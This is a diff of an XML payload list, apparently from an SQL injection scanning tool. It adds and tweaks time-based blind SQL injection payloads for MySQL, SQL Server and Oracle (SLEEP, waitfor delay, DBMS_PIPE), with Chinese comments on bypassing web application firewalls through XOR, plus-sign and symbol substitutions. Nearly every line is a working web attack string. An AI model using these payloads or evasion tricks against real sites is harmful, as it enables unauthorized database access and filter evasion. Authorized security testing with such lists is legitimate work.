@@ -8,15 +8,16 @@
 
     <!-- MySQL -->
     <dbms value="MySQL">
-        <payload value=".0=SLEEP(5)"/>
+        <payload value=".0=SLEEP(5.0)"/>
+        <!-- sleep是最先执行的语句，or sleep = sleep都不行，暂不知道啥原因 -->
         <payload value=".0=(SELECT%201%20FROM%20(SELECT(SLEEP(5)))Gbqj)"/>
         <!--waf-->
         <!--'=SLEEP(5.0)='-->
-        <payload value="'=SLEEP(5)='"/>
+        <payload value="'=SLEEP(5.0)='"/>
         <!--'=SLEEP(5)='等号可能是失效，使用加号却可以-->
-        <payload value="'%2bSLEEP(5)%2b'"/>
-        <!--XOR是考虑fase and sleep()-->
-        <payload value="'=SLEEP(5)%20XOR'"/>
+        <payload value="'%2bSLEEP(5.0)%2b'"/>
+        <!--XOR是考虑1、fase and sleep() 2、XOR这里只能是字母，而非符号。 不适用xor是避免关键词-->
+        <payload value="'XOR(sleep(5.0))XOR'"/>
         <!--面对表为空，或者false and sleep(5)这种情形-->
         <!--<payload value="'=(SELECT%201%20FROM%20(SELECT(SLEEP(5)))Gbqj)='"/>-->
         <payload value=".0=(select(0)from(select(sleep(5)))v)/*'=(select(0)from(select(sleep(5)))v)='%22=(select(0)from(select(sleep(5)))v)=%22*/"/>
@@ -35,6 +36,7 @@
         <!--waf-->
         <!--<payload value="'%20WHILE%201=1%20PRINT%201&#45;&#45;&#45;&#45;"/>-->
         <payload value="'%20WHILE%201=1%20CONTINUE---s"/>
+        <!-- and 1=2 waitfor delay '0:0:5'是不会延迟的 '%20or%201=1%20waitfor%20delay%20'0:0:5'%20注释s -->
         <payload value="'%20waitfor%20delay%20'0:0:5'%20--s"/>
         <payload value="%20waitfor%20delay%20'0:0:5'%20--s"/>
         <payload value=")%20waitfor%20delay%20'0:0:5'%20--s"/>
@@ -44,7 +46,7 @@
 
     <!-- Oracle -->
     <dbms value="Oracle">
-        <payload value="or%201=DBMS_PIPE.RECEIVE_MESSAGE(CHR(105)||CHR(69)||CHR(114)||CHR(69),5)"/>
+        <payload value="%20or%201=DBMS_PIPE.RECEIVE_MESSAGE(CHR(105)||CHR(69)||CHR(114)||CHR(69),5)"/>
         <payload value="||DBMS_PIPE.RECEIVE_MESSAGE(CHR(105)||CHR(69)||CHR(114)||CHR(69),5)"/>
         <payload value="'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(105)||CHR(69)||CHR(114)||CHR(69),5)||'"/>
         <!--后面使用or '1'='2,数据库可能优化or '1'='1'-->
@@ -72,11 +74,13 @@
         <payload value="*1"/>
         <payload value="%20--%20s"/>
         <!--payload后面改成不等于，%20or%20%27%26%27!=%27 -->
+        <!--or后面加注释，是因为 and 1=1 or 1=1 and 1=2， 由于双输入点，使用要注释 and 1=2 , payload 为 %20or%20%27%26%27=%27%26%27 注释  -->
         <payload value="%20or%20%27%26%27=%27%26"/>
         <payload value="'%20'"/>
         <payload value="'||'"/>
         <payload value="'%2b'"/>
         <payload value="'%20--%20s"/>
+        <payload value="%22%20--%20s"/>
         <!--使用符号绕waf，' or '&'='&-->
         <payload value="'%20or%20%27%26%27=%27%26"/>
         <!--注入在by `id`,SELECT * FROM module_softwares WHERE `Enable`='1' ORDER BY `uid`` DESC LIMIT 0,20-->
